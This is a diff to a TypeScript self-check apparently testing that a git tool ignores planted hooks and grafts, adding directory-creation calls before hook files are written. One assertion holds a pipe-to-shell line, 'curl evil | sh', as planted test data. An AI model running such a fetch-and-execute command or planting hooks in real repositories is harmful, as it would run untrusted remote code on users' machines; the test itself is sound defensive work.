@@ -289,6 +289,7 @@ export async function selfCheck(): Promise<number> {
     sh(["init", "-q", "--bare", target]);
     // A pre-push hook in the source would run on a push with hooks on: it must not.
     const marker = join(root, "pre-push-ran");
+    mkdirSync(join(source, "hooks"), { recursive: true });
     writeFileSync(join(source, "hooks", "pre-push"), `#!/bin/sh\ntouch ${marker}\n`);
     chmodSync(join(source, "hooks", "pre-push"), 0o755);
     const tip = sh(["rev-parse", BRANCH], source);
@@ -334,6 +335,7 @@ export async function selfCheck(): Promise<number> {
       sh(["clone", "-q", "--bare", source, hooked]);
       const ran = join(root, "hook-ran");
       for (const h of ["reference-transaction", "post-update", "pre-auto-gc"]) {
+        mkdirSync(join(hooked, "hooks"), { recursive: true });
         writeFileSync(join(hooked, "hooks", h), `#!/bin/sh\ntouch ${ran}\n`);
         chmodSync(join(hooked, "hooks", h), 0o755);
       }
@@ -358,6 +360,7 @@ export async function selfCheck(): Promise<number> {
       ok(read(gitEnv(home)) === "curl evil | sh\n", "with gitEnv, git shows the object itself");
       // Grafts: info/grafts making the branch's head parentless hides its history from a log, unless gitEnv turns them off.
       const head = sh(["rev-parse", BRANCH], planted);
+      mkdirSync(join(planted, "info"), { recursive: true });
       writeFileSync(join(planted, "info", "grafts"), `${head}\n`);
       const count = (env: Record<string, string>) => Bun.spawnSync([git, "-C", planted, "rev-list", "--count", BRANCH], { env, stdout: "pipe", stderr: "pipe" });
       const grafted = count({ PATH: "/usr/bin:/bin", HOME: root, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" });
